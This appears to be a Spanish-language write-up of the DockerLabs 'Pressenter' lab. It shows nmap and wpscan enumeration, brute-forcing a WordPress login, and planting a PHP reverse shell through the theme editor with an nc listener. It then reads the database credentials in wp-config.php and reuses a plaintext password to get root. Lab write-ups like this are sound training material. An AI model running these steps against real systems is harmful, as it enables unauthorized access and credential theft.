Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #wordpress #wpscan #brute-force #mysql #password-reuse #theme-editor

![](assets/Pasted%20image%2020251107001007.png)

## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

```bash
> ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.250 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.250/0.250/0.250/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
> nmap -p- -sS -Pn -n --min-rate 5000 172.17.0.2 -oN ports.txt
--------------------------------------------------------------
PORT   STATE SERVICE
80/tcp open  http
```

- Solo tenemos el puerto 80 abierto.

Sobre el puerto abierto realizo un segundo escaneo más profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
> sudo nmap -p 80 -sCV -Pn -n --min-rate 5000 -sS 172.17.0.2 -oN target.txt
-----------------------------------------------------------------------------------
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Pressenter CTF
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:29:1E:07:C2:61 (Unknown)
```

- Puerto 80 HTTP Apache httpd 2.4.58 (Ubuntu)

## Enumeración

### Puerto 80 HTTP

La página principal muestra una landing page simple del CTF.

![](assets/Pasted%20image%2020251107001538.png)

También existe una página de login accesible.

![](assets/Pasted%20image%2020251107001818.png)

**Código Fuente.**

Inspeccionando el código fuente de la página principal encuentro un dominio oculto en el footer.

```html
<footer>
    <p>&copy; 2024 Pressenter CTF. All rights reserved.</p>
    <p class="hidden-domain">Find us at <a href="http://pressenter.hl" target="_blank">pressenter.hl</a></p>
</footer>
```

Agrego el dominio al archivo `/etc/hosts`.

```bash
> cat /etc/hosts
172.17.0.2 pressenter.hl
```

### Dominio pressenter.hl

**Identificación de Tecnologías Web.**

Accedo al dominio `pressenter.hl` y Wappalyzer detecta que se trata de un sitio WordPress.

![](assets/Pasted%20image%2020251107003510.png)

Confirmo que el panel de administración de WordPress está expuesto en la ruta `/wp-admin`.

![](assets/Pasted%20image%2020251107003605.png)

**Enumeración de WordPress con WPScan.**

Utilizo `wpscan` para enumerar usuarios y posibles vulnerabilidades en la instalación de WordPress.

```bash
> sudo wpscan --url http://pressenter.hl --enumerate u,vp
```

El escaneo revela:

- **2 vulnerabilidades identificadas:** (Aunque no son nada relevante para la explotacion.)
  - CVE-2025-58674: XSS almacenado en DOM (Author+)
  - CVE-2025-58246: Divulgación de datos sensibles (Contributor+)

- **Usuarios identificados:**
  - `pressi`
  - `hacker`

```bash
[i] User(s) Identified:

[+] pressi
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] hacker
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

## Explotación

Con los usuarios identificados, realizo un ataque de **fuerza bruta** contra el panel de login de WordPress utilizando `wpscan` y el diccionario `rockyou.txt`.

```bash
> sudo wpscan --url http://pressenter.hl -U pressi -P /usr/share/wordlists/rockyou.txt
---------------------------------------------------------------------------------------
[!] Valid Combinations Found:
 | Username: pressi, Password: dumbass
```

- Encuentro credenciales válidas: `pressi:dumbass`

Accedo al panel de administración de WordPress con estas credenciales.

**Subida de Reverse Shell mediante Theme Editor**

Una vez dentro del panel de WordPress, me dirijo a **Herramientas → Editor de archivos de temas** y selecciono el tema `Twenty Twenty Two`. Edito el archivo `index.php` del tema para incluir una reverse shell en PHP. Yo utilice la Reverse-shell de [PentestMonkeyRevSh](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

![](assets/Pasted%20image%2020251107010844.png)

Me pongo en escucha en mi máquina atacante.

```bash
> sudo nc -nlvp 443
listening on [any] 443 ...
```

Accedo a la ruta donde se almacenan los temas para ejecutar la reverse shell.

```
http://pressenter.hl/wp-content/themes/twentytwentytwo/
```

Recibo la conexión y obtengo acceso al sistema como `www-data`.

```bash
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 45678
www-data@23bf441840e6:/$ whoami
www-data
www-data@23bf441840e6:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Escalada de Privilegios

### Enumeración de Credenciales en wp-config.php

El archivo `wp-config.php` de WordPress contiene información sensible como credenciales de base de datos. Busco y leo este archivo.

```bash
> find / -name "wp-config.php" 2>/dev/null
/var/www/pressenter/wp-config.php

> cat /var/www/pressenter/wp-config.php
----------------------------------------
/** Database username */
define( 'DB_USER', 'admin' );

/** Database password */
define( 'DB_PASSWORD', 'rooteable' );
```

- Encuentro credenciales de MySQL: `admin:rooteable`

### Enumeración de la Base de Datos MySQL

Me conecto a la base de datos MySQL con las credenciales encontradas.

```bash
> mysql -u admin -p'rooteable' -h 127.0.0.1
```

Listo las bases de datos disponibles.

```mysql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| wordpress          |
+--------------------+
```

Selecciono la base de datos `wordpress` y listo sus tablas.

```mysql
mysql> use wordpress;
mysql> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_usernames          |
| wp_users              |
+-----------------------+
```

Encuentro una tabla no estándar llamada `wp_usernames`. La inspecciono.

```mysql
mysql> select * from wp_usernames;
+----+----------+-----------------+---------------------+
| id | username | password        | created_at          |
+----+----------+-----------------+---------------------+
|  1 | enter    | kernellinuxhack | 2024-08-22 13:18:04 |
+----+----------+-----------------+---------------------+
```

- Encuentro credenciales: `enter:kernellinuxhack`

### Migración al usuario enter

Utilizo las credenciales para migrar al usuario `enter`.

```bash
www-data@23bf441840e6:/$ su enter
Password: kernellinuxhack
enter@23bf441840e6:/$ whoami
enter
```

Ahora enumero binarios que pueda ejecutar como el usuario `root`

```bash
enter@23bf441840e6:/$ sudo -l
Matching Defaults entries for enter on 23bf441840e6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User enter may run the following commands on 23bf441840e6:
    (ALL : ALL) NOPASSWD: /usr/bin/cat
    (ALL : ALL) NOPASSWD: /usr/bin/whoami
```

- Puedo ejecutar `cat` y `whoami` como cualquier usuario sin contraseña.

Aunque tengo acceso a `cat` como root, lo cual podría permitirme leer archivos sensibles, decido probar la **reutilización de contraseñas** para el usuario root.

```bash
enter@23bf441840e6:/$ su root
Password: kernellinuxhack

root@23bf441840e6:/# whoami
root
root@23bf441840e6:/# id
uid=0(root) gid=0(root) groups=0(root)
```

- La contraseña `kernellinuxhack` también funciona para el usuario root.

***PWNED***